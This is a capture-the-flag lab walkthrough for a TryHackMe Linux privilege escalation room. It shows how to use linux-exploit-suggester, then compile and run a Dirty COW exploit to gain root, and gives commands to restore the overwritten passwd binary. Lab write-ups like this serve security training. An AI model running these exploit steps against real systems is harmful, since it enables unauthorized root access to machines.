# Linux PrivEsc Arena

**Room Link:** [https://tryhackme.com/room/linuxprivescarena](https://tryhackme.com/room/linuxprivescarena)



## Privilege Escalation - Kernel Exploits

In command prompt type:&#x20;

**Victim**

```
/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
```

From the output, notice that the OS is vulnerable to “dirtycow”.

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Exploitation

Linux VM

In command prompt type:&#x20;

**Victim**

```
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
```

In command prompt type:&#x20;

**Victim**

```
./c0w
```

Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.

In command prompt type:&#x20;

**Victim**

```
passwd
```

In command prompt type:&#x20;

**Victim**

```
id
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

From here, either copy /tmp/passwd back to /usr/bin/passwd or reset your machine to undo changes made to the passwd binary

**Victim**

```
ls -lah /usr/bin/passwd 
rm -f /usr/bin/passwd   
cp /tmp/bak /usr/bin/passwd 
ls -lah /usr/bin/passwd 
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

